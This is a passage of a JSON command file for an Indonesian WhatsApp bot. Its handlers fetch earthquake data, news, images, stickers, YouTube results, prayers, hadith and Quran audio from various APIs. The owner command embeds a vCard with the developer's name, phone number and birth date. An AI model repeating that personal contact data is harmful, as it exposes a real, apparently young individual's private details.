    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "menampilkan kontak developer",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, store, botNumber}) => {\nconst more = String.fromCharCode(8206)\nconst readmore = more.repeat(4001) \nconst loli = [[global.dev,\"Satzz.\",\"Developer\",'It always seems impossible until it\\'s done.']]\nlet vcard = `\nBEGIN:VCARD\nVERSION:3.0\nFN;CHARSET=UTF-8:Kurniawan Satria\nN;CHARSET=UTF-8:Satria;Kurniawan;;;\nitem1.TEL;waid=6282170988479:+62 821-7098-8479\nitem1.X-ABLabel:Phone\nDESCRIPTION;CHARSET=UTF-8:It always seems impossible until it's done.\nORG;CHARSET=UTF-8:Developer\nBDAY:June, 05 2007\nEND:VCARD\n`\n/*conn.sendMessage(m.chat, {contacts: { contextInfo:{\nexternalAdReply: {\nshowAdAttribution: true,\nmediaType: 1,\ntitle: 'SatzzDev.',\nsourceUrl: global.link,\nrenderLargerThumbnail: true,\nthumbnailUrl: 'https://i.pinimg.com/originals/6b/45/3a/6b453a1ed9673d56e34673b281ede225.jpg'}}, \ncontacts: [{ vcard }], displayName: 'Сатрия Дев' }},{quoted:m}); */\nlet key = await conn.sendContactArray(m.chat, loli, m)\n//await conn.sendButtons(m.chat, '', 'itu kontak ownerku, kalo mau nanya nanya, tanya aja:v', global.author, [{ type: 'url', text: 'Grup Bot', id: global.sgc },{ type: 'url', text: 'Instagram', id: 'https://instagram.com/krniwnstria' },{ type: 'url', text: 'Github', id: 'https://github.com/SatganzDevs' }], key)\n}",
    "on": "message",
    "command": "/^(owner|creator)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": true,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mendapatkan Informasi Gempa",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\ntry {\nlet res = await Gempa();\nif (res.length > 0) {\nconst latestEarthquake = res[0]; // Assuming the first row is the latest earthquake\nconst message = `*\\`INFO - GEMPA\\`*\n⭔ _Tanggal:_ ${latestEarthquake.Tanggal}\n⭔ _Jam:_ ${latestEarthquake.Jam}\n⭔ _Lintang:_ ${latestEarthquake.Lintang}\n⭔ _Bujur:_ ${latestEarthquake.Bujur}\n⭔ _Magnitudo:_ ${latestEarthquake.Magnitudo}\n⭔ _Kedalaman:_ ${latestEarthquake.Kedalaman}\n⭔ _Wilayah:_ ${latestEarthquake.Wilayah}`;\nm.reply(message);\n} else {\nm.reply('No earthquake data found.');\n}\n} catch (error) {\nconsole.error('Error fetching earthquake data:', error);\nm.reply('Failed to fetch earthquake data.');\n}\n}",
    "on": "message",
    "command": "/^(infogempa|gempa)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "informasi bot aktif",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nm.reply(runtime(process.uptime()));\n}",
    "on": "message",
    "command": "/runtime/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Pengetesan",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn }) => {\nconst used = process.memoryUsage()\nlet timestamp = speed()\nlet latensi = speed() - timestamp\nlet neww = performance.now()\nlet oldd = performance.now()\nlet respon = `\n\\`Kecepatan Respon\\` \n> ${latensi.toFixed(4)} _Detik_ \n\n\\`Info Server\\`\n> RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}\n\n\\`Penggunaan Memori NodeJS\\`\n${Object.keys(used).map((key, _, arr) => `> ${key.padEnd(Math.max(...arr.map(v=> v.length)),' ')}: ${formatp(used[key])}`).join('\\n')}\n\n`.trim()\n\nm.reply(respon);\n}",
    "on": "message",
    "command": "/^ping|test$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "informasi kecepatan bot",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn}) => {\nconst timestampp = speed();\nconst latensi = speed() - timestampp\nm.reply(`Kecepatan: ${latensi.toFixed(4)} Detik`)\n}",
    "on": "message",
    "command": "/^speed$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mendapatkan Berita Terkini",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst menuItems = [\n{ title: ttle(\"News\"), rows: [\"Nasional\", \"Regional\", \"Internasional\", \"Politik\", \"Peristiwa\", \"Hukum\"] },\n{ title: ttle(\"Showbiz\"), rows: [\"Selebritis\", \"Film\", \"Musik\", \"Trivia\", \"Viral\"] },\n{ title: ttle(\"Edukasi\"), rows: [\"Sains\", \"Pendidikan\", \"Kampus\"] },\n{ title: ttle(\"Food & Travel\"), rows: [\"UMKM\", \"Travel\", \"Kuliner\", \"Startup\"] },\n{ title: ttle(\"Oto & Tekno\"), rows: [\"Otomotif\", \"Teknologi\", \"Gadget\"] },\n{ title: ttle(\"Sport\"), rows: [\"Bola\"] }\n];\nconst itemList = menuItems.map(item => ({\ntitle: item.title,\nrows: item.rows.map(row => ({\ntitle: row,\nid: `.berita ${row.toLowerCase().replace(/\\s+/g, '-')}`\n}))\n}));\nif (!m.query) return conn.sendListMsgV3(m.chat, '', 'berita apa?', global.author, ttle(\"PILIH\"), itemList, m);\nlet {pitutur} = require(\"../lib/scrapes\")\nlet res = await pitutur(m.query)\nlet sex = []\nfor (let rizz of res.result) {\nsex.push({title: rizz.day, rows: [{ title: rizz.hour, description: rizz.title, id: `.getberita ${rizz.url}`}]})\n}\nlet j = m.query.toUpperCase()\nconn.sendListMsgV3(m.chat, ftxt(`BERITA - ${j}`), '', global.author, ttle(j), sex, m)\n}",
    "on": "message",
    "command": "/berita/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Random Couple",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nlet anu = await fetchJson(\"https://raw.githubusercontent.com/SatganzDevs/database/main/kopel.json\");\nlet random = pickRandom(anu)\nawait conn.sendMessage(m.chat, { image: { url: random.male }, caption: `laki`},{ quoted: m });\nawait conn.sendButtons(m.chat, '', 'Bini', author, [{type:'btn', text: ttle('NEXT'), id: `.${command}`}], m, {img: random.female });\n}",
    "on": "message",
    "command": "/^(couple|cp)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "gambar kucing random",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst {q} = m\n//if (!q) return m.reply(`Penggunaan Salah! contoh penggunaan:\\n .${command} satria`)\nlet data = await fetchJson(`https://api.thecatapi.com/v1/images/search`) \nconn.sendMessage(m.chat, {image: {url:data[0].url}})\n}",
    "on": "message",
    "command": "/^cat$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "menebak gender berdasarkan nama",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst {q} = m\nif (!q) return m.reply(`Penggunaan Salah! contoh penggunaan:\\n .${command} satria`)\nlet data = await fetchJson(`https://api.genderize.io/?name=${q}`) \nlet tkes =`*GENDER CHECK*\n_Name:_ *${q}*\n_Count:_ ${data.count}\n_Gender:_ ${data.gender}\n_Probability:_ ${data.probability}\n`\nm.reply(tkes)\n}",
    "on": "message",
    "command": "/^cekgender$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "to Get News informations",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet res = await getpttur(m.query)\nconn.sendMessage(m.chat, {image: {url: res.image}, caption:`${ftxt(`BERITA - ${m.query.split('https://www.pitutur.id/')[1].split('/')[0].toUpperCase()}`)}\\n\\n_TANGGAL:_ ${res.tanggal}\\n\\n_ARTIKEL:_ ${res.deskripsi}\\n\\n> www.pitutur.id`},{quoted:m})\n}",
    "on": "message",
    "command": "/getberita/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "mencari gambar di pinterest lalu mengirimnya sebagai stiker",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nif (!q) return reply('masukan query image!')\nawait reply(global.mess.wait)\nlet res = await pinterest(q);\nfor (let ai of res) {\nconn.sendImageAsSticker(m.chat, await getBuffer(ai), m, {pack: packname, author: author}) \n}\n}",
    "on": "message",
    "command": "/^(pinstik|stikpin|pinsticker)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async(m, {conn, text, reply}) => {\nif (!text) return reply(\"apaan ajg, kosong\") \nconst options = new URLSearchParams();\n        options.append(\"text\", text);\n        options.append(\"lc\", \"id\");\naxios.post(\"https://api.simsimi.vn/v2/simtalk\", options, {\n                headers: {\n                    \"Content-Type\": \"application/x-www-form-urlencoded\",\n                },\n                timeout: 6000,\n            }).then(res => reply(res.data.message)) \n}",
    "on": "message",
    "command": "/^simi$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "menampilkan list random meme audio",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet res = await getAllSound()\nlet sect = [{title: 'SOUND MEME', rows: res }]\nconn.sendListMsgV3(m.chat, 'SOUNDS MEME', '', global.author, 'Click Here', sect, m)\n}",
    "on": "message",
    "command": "/^soundmeme$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nawait conn.sendMessage(m.chat, {audio: {url:m.query}, ptt:true, mimetype:'audio/mpeg', waveform:new Uint8Array(64)},{quoted:m})\n}",
    "on": "message",
    "command": "/^sendvn$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async(m, {conn, text}) => {\nif (!text) return m.reply('nama hero?')\nlet btn = await soundML(text)\nawait conn.sendListMsg(m.chat, 'Result Of Heroes ' + text.toUpperCase(), 'Click The Button Bellow.', global.author, 'Click Here', 'Select One', 'Hot', btn, m)\n}",
    "on": "message",
    "command": "/^voiceml$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async(m, {conn, text}) => {\nlet audioUrl = text;\nlet audio = await toAudio(await getBuffer(audioUrl), 'mp4')\nconn.sendMessage(m.chat, {\n    audio: audio,\n    mimetype: 'audio/mp4',\n    ptt: true, \n    waveform: new Uint8Array(64)\n}, { quoted: global.fake });\n}",
    "on": "message",
    "command": "/sendvoiceml/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": true,
    "limit": false,
    "glimit": false,
    "desc": "Mendapatkan Random Story Anime",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\ntry {\nconst urls = ['victher_','kuro_xyz','rummmxygoad',''];\nlet sheesh = await pickRandom(urls)\nlet res = await fetchJson(`https://aemt.me/download/asupantt?username=${sheesh}`).catch(_ => fetchJson(`https://aemt.me/download/asupantt?username=${sheesh}`))\nawait conn.sendMediaButtons(m.chat, '', '', global.author,[{type:'btn',text:'Next',id:'.storyanime'}],m,{video:res.result.data.video});\n} catch {\nconst urls = ['victher_','kuro_xyz','rummmxygoad',''];\nlet sheesh = await pickRandom(urls)\nlet res = await fetchJson(`https://aemt.me/download/asupantt?username=${sheesh}`).catch(_ => fetchJson(`https://aemt.me/download/asupantt?username=${sheesh}`))\nawait conn.sendMediaButtons(m.chat, '', '', global.author,[{type:'btn',text:'Next',id:'.storyanime'}],m,{video:res.result.data.video});\n}\n}",
    "on": "message",
    "command": "/storyanime/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Get Sticker from Telegram Sticker",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet { reply, q } = m;\nconst query = q.split(\"|\")[0]?.trim();\nlet count = q.split(\"|\")[1];\n\nif (!query) {\nreturn reply(\"*❗ Masukan tidak sesuai.*\\nGunakan format yang benar: *stickertele [query]* atau *stickertelegram [query]|[angka]* atau *telesticker [query]|all* atau *telegramsticker [query]|random*\");\n}\n\ntry {\nconst stickers = await fetchStickers(query);\nif (!stickers.length) {\nreturn m.reply(\"*❗ Stiker tidak ditemukan.*\\nHarap coba dengan nama stiker yang berbeda.\");\n}\n\nif (!count || \"random\" === count.toLowerCase()) {\nconst randomSticker = getRandomSticker(stickers);\nreturn await conn.sendImageAsSticker(m.chat, await getBuffer(randomSticker.url), m, {packname, author}) \n}\n\nif (\"all\" !== count.toLowerCase()) {\nconst stickerNumber = parseInt(count) - 1;\nif (isNaN(stickerNumber) || stickerNumber < 0 || stickerNumber >= stickers.length) {\nreturn m.reply('*❗ Nomor stiker tidak valid.*\\nHarap berikan nomor stiker yang valid atau gunakan \"random\" untuk mengirim stiker secara acak atau \"all\" untuk mendapatkan semua stiker.');\n}\nreturn await conn.sendImageAsSticker(m.chat, await getBuffer(stickers[stickerNumber].url), m, {packname, author})\n}\n\nfor (let i = 0; i < stickers.length; i++) {\nawait  conn.sendImageAsSticker(m.chat, await getBuffer(stickers[i].url), m, {packname, author})\n\n}\n} catch (error) {\nreturn m.reply(\"*❗ Terjadi kesalahan saat mengambil stiker.*\\nSilakan coba lagi nanti.\");\n}\n}",
    "on": "message",
    "command": "/^(telegramsticker|telestick|stikertelegram|stikertele|telestik)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, reply, text }) => {\n  if (!text) return reply(\"Mana promptnya! Humph😤\");\n  \n  await reply(global.mess.wait);\n  \n  try {\n    const response = await axios.get(`https://apidl.asepharyana.cloud/api/ai/waifu-diff?prompt=${encodeURIComponent(text)}&style=Anime`, { responseType: \"arraybuffer\" });\n    \n    const imageBuffer = Buffer.from(response.data, \"binary\");\n    \n    await conn.sendMessage(m.chat, { image: imageBuffer, caption: \"*`W A I F U - D I F F U S I O N`*\" }, { quoted: m });\n  } catch (error) {\n    console.error(error);\n    await reply(\"Gagal mengunduh gambar!\");\n  }\n}",
    "on": "message",
    "command": "/^diffusion$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet { reply, q } = m\nlet qontol = await fetchJson(`https://id.wikipedia.org/w/rest.php/v1/search/title?q=${q}&limit=10`)\nlet res = await wikipedia(qontol.pages[0].key)\nlet tks ='\\n\\n'\ntks += `_Title:_ ${res.result.title}`\ntks += `_Desc:_ ${res.result.desc}`\nconn.sendButtons(m.chat, '*`WIKIPEDIA`*', tks, author, [{type: \"url\", text:\"Go To Link\", id: `https://id.wikipedia.org/wiki/${qontol.pages[0].key}`}], m, {img: res.result.thumb})\n}",
    "on": "message",
    "command": "/^(wikipedia|wiki)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mencari Video Dari YouTube",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet { reply, q } = m;\nif (!q) return reply(`Example : ${command} story wa anime`);\nawait reply(global.mess.wait)\nlet yts = require(\"yt-search\");\nlet search = await yts(q);\nlet totalResults = search.all.length; // Dynamically set based on actual results\nlet no = 1;\nlet results = [];\nasync function createImageMessage(imageUrl) {\nconst { imageMessage } = await generateWAMessageContent({ 'image': { 'url': imageUrl } }, { 'upload': conn.waUploadToServer });\nreturn imageMessage;\n}\nfor (let i of search.all) {\n  results.push({\n    'body': proto.Message.InteractiveMessage.Body.fromObject({\n      'text': `⏣ •  Title: ${i.title}\\n⏣ •  Upload At: ${i.ago}\\n⏣ •  Duration: ${i.timestamp}\\n*╰────────────⦁*`\n    }),\n    'footer': proto.Message.InteractiveMessage.Footer.fromObject({\n      'text': global.author\n    }),\n    'header': proto.Message.InteractiveMessage.Header.fromObject({\n      'title': `*❲ R E S U L T ${no++}/${totalResults}* ❳`, // Dynamic total count\n      'hasMediaAttachment': true,\n      'imageMessage': await createImageMessage(i.thumbnail)\n    }),\n    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({\n      'buttons': [\n        {\n          'name': \"cta_url\",\n          'buttonParamsJson': JSON.stringify({\n            \"display_text\": \"Open On YouTube\",\n            \"url\": i.url,\n            \"merchant_url\": i.url\n          })\n        },\n        {\n          'name': \"quick_reply\",\n          'buttonParamsJson': JSON.stringify({\n            \"display_text\": \"Download Audio\",\n            \"id\": '.ytmp3 ' + i.url\n          })\n        },\n        {\n          'name': \"quick_reply\",\n          'buttonParamsJson': JSON.stringify({\n            \"display_text\": \"Download Video\",\n            \"id\": '.ytmp4 ' + i.url\n          })\n        }\n      ]\n    })\n  });\n}\n\nconst messageContent = generateWAMessageFromContent(m.chat, {\n'viewOnceMessage': {\n'message': {\n'messageContextInfo': {\n'deviceListMetadata': {},\n'deviceListMetadataVersion': 2\n},\n'interactiveMessage': proto.Message.InteractiveMessage.fromObject({\n'body': proto.Message.InteractiveMessage.Body.create({\n'text': 'YouTube Search Results Of ' + q + ':'\n}),\n'footer': proto.Message.InteractiveMessage.Footer.create({\n'text': ''\n}),\n'header': proto.Message.InteractiveMessage.Header.create({\n'hasMediaAttachment': false\n}),\n'carouselMessage': proto.Message.InteractiveMessage.CarouselMessage.fromObject({\n'cards': results\n})\n})\n}\n}\n}, {});\n\nawait conn.relayMessage(m.chat, messageContent.message, {\n'messageId': messageContent.key.id\n});\n}",
    "on": "message",
    "command": "/yts|ytsearch/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "menampilkan list doa",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command }) => {\nlet res = await fetchJson(`https://muslim-api-two.vercel.app/doa/`);\nlet data = res.data;\nlet sections = [];\nlet categories = {\nharian: \"Harian\",\npilihan: \"Pilihan\",\nquran: \"Quran\",\nhadits: \"Hadits\",\nibadah: \"Ibadah\",\nhaji: \"Haji\",\nlainnya: \"Lainnya\"\n};\nfor (let category in categories) {\nlet categoryData = data.filter(dua => dua.source === category);\nif (categoryData.length > 0) {\nsections.push({\ntitle: categories[category],\nrows: categoryData.map((dua, index) => ({\ntitle: dua.judul,\nid: `.getdua ${dua.source} ${index}` \n}))\n});\n}\n}\nawait conn.sendListMsgV3(m.chat, 'Daftar Doa', 'Pilih doa yang ingin Anda baca:', global.author,  'Daftar Doa', sections, m);\n}",
    "on": "message",
    "command": "/^doa$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command , args }) => {\n//m.reply(args[0] + ' ' + args[1])\nlet res = await fetchJson(`https://muslim-api-two.vercel.app/doa/${args[0]}`);\nlet selectedDua = res.data[args[1]];\nlet message = `*${selectedDua.judul}*\\n\\n${selectedDua.arab}\\n\\n${selectedDua.indo}\\n\\nsource from ${selectedDua.source}`;\nm.reply(message);\n}",
    "on": "message",
    "command": "/^getdua$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "menunjukan list hadits",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command }) => {\ntry {\nlet response = await fetchJson(`https://muslim-api-two.vercel.app/hadits`);\nlet allHadits = response.data.map((hadit, index) => {\nreturn [hadit.judul, `.gethadits ${hadit.no}`];\n});\n\nif (allHadits.length === 0) {\nreturn m.reply('No Hadits found.');\n}\n\nawait conn.sendListMsg(\nm.chat, \n'Daftar Hadits', \n'Pilih hadits yang ingin Anda baca:', \nglobal.author, \n'List Hadits', \n'Available hadits', \n'HOT', \nallHadits, \nm\n);\n\n} catch (error) {\nconsole.error(error);\nm.reply('Error fetching data. Please try again later.');\n}\n}",
    "on": "message",
    "command": "/^(hadits|hadis)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, text }) => {\ntry {\nlet response = await fetchJson(`https://muslim-api-two.vercel.app/hadits/${text}`);\nlet hadit = response.data[0];\nlet message = `*${hadit.judul}*\\n\\n${hadit.arab}\\n\\n${hadit.indo}`;\nm.reply(message);\n} catch (error) {\nconsole.error(error);\nm.reply('Error fetching data. Please try again later.');\n}\n}",
    "on": "message",
    "command": "/^gethadits$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, text }) => {\nreturn m.reply(global.hijri);\n}",
    "on": "message",
    "command": "/^(hijri|hijricalendar)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "informasi jadwal sholat",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, text }) => {\nif (!text) {\nlet sections = await getAllProvinces();\nreturn conn.sendListMsg(m.chat, '', 'List of Available Provinces', global.author, 'Click Me', 'Province List', 'Owner Location', sections, m);\n} else {\nlet res = await jadwalSholat(text);\nif (res.status === 'ok') {\nlet message = `${res.daerah}\\n${res.tanggal} ${res.bulan}\\n\\n`;\nmessage += `_Imsyak:_ ${res.imsyak}\\n`;\nmessage += `_Shubuh:_ ${res.shubuh}\\n`;\nmessage += `_Terbit:_ ${res.terbit}\\n`;\nmessage += `_Dhuha_: ${res.dhuha}\\n`;\nmessage += `_Dzuhur:_ ${res.dzuhur}\\n`;\nmessage += `_Ashr:_ ${res.ashr}\\n`;\nmessage += `_Maghrib:_ ${res.maghrib}\\n`;\nmessage += `_Isya:_ ${res.isya}\\n`;\n\nreturn m.reply(message);\n} else {\nreturn m.reply(`Gagal mendapatkan jadwal sholat: ${res.error}`);\n}\n}\n}",
    "on": "message",
    "command": "/^(jadwalsholat|jadwalshalat)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command }) => {\nlet { q } = m;\nif (!q) {\ntry {\nlet res = await fetchJson('https://api.dikiotang.com/quran/surah');\nlet rows = res.data.map((surah, index) => ([`Surah ${surah.name_id} (${surah.revelation_id})`, `.surah ${index + 1}`]));\nawait conn.sendListMsg(\nm.chat,\n'List of Surahs',\n'Select a surah to view its information',\nglobal.author,\n'Click Here',\n'List of Surahs',\n'1',\nrows,\nm\n);\n} catch (error) {\nconsole.error(error);\nm.reply('An error occurred while fetching data');\n}\n} else if (isNaN(q)) {\nreturn m.reply('Surah must be a number!, use example: .' + command + ' 17');\n} else {\ntry {\nlet res = await fetchJson(`https://raw.githubusercontent.com/Jabalsurya2105/database/master/surah/surah%20${q}.json`);\nlet msg = `\n_Surah:_ ${res.name}\n_Number:_ ${res.number}\n_Type:_ ${res.type}\\n\n_Ayah Count:_ ${res.jumlah_ayat}\n`;\nlet rows = res.ayat.map((ayah, index) => ([`Ayat ${ayah.no}`, `.qs ${q}:${index + 1}`]));\nawait conn.sendListMsg(\nm.chat,\n'Surah Information',\nmsg,\nglobal.author,\n'Click Here',\n'List Avaliable Ayah',\n'1',\nrows,\nm\n);\n} catch (error) {\nconsole.error(error);\nm.reply('An error occurred while fetching data');\n}\n}\n}",
    "on": "message",
    "command": "/^surah$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet { q } = m;\nif (!q) return m.reply('Enter the surah number example: .' + command + ' 17:32');\nlet surah = q.split(':')[0];\nlet ayah = q.split(':')[1];\nlet iyh = ayah - 1\nif (isNaN(surah) || isNaN(ayah)) return m.reply('surah or ayah must be a number!, use example: .' + command + '17:32');\ntry {\nlet res = await fetchJson(`https://raw.githubusercontent.com/Jabalsurya2105/database/master/surah/surah%20${surah}.json`); \nlet ayh = res.ayat[iyh]\nconsole.log(ayh)\n//if (!ayh) return m.reply('Ayah not found');\nlet msg = `${ftxt('乂 ' + res.name.replace(\"'\", \"\"))}\\n\nAyat ${ayh.no}\n${ayh.arab}\\n\n${ayh.latin}\\n\nArtinya: ${ayh.id}\\n\nTafsir: ${ayh.tafsir}\\n\n`;\nawait m.reply(msg);\nawait conn.sendMessage(m.chat, { audio: await getBuffer(ayh.audio), ptt: true, mimetype: 'audio/mpeg', waveform: new Uint8Array(64), contextInfo }, { quoted: m });\n} catch (error) {\nconsole.error(error);\nm.reply('An error occurred while fetching data');\n}\n}",
    "on": "message",
    "command": "/^(quransurah|qs)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, text}) => {\nif (!text) return m.reply('Enter the surah number example: .'+ command +' 23')\ntext = parseInt(text); \nif (text < 10) {\ntext = `00${text}`; \n} else if (text < 100) {\ntext = `0${text}`; \n}\nconn.sendMessage(m.chat, {audio: {url:'https://download.quranicaudio.com/quran/yasser_ad-dussary/'+ text +'.mp3'}, ptt:true, mimetype:'audio/mpeg', waveform: new Uint8Array(64), contextInfo},{quoted:m})\n}",
    "on": "message",
